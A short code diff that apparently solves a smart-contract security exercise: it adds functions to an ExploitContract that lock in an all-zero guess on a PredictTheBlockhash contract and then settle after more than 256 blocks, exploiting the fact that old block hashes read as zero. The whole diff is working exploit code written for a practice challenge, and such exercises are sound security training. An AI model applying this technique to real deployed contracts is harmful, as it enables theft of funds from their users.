@@ -53,4 +53,16 @@ contract ExploitContract {
     }
 
     // write your exploit code below
+    function setup() public payable {
+        bytes32 empty;
+        predictTheBlockhash.lockInGuess{value: 1 ether}(empty);
+    }
+
+
+    // wait over 258 blocks first
+    function exploit() public {
+        predictTheBlockhash.settle();
+    }
+
+    receive() external payable {}
 }
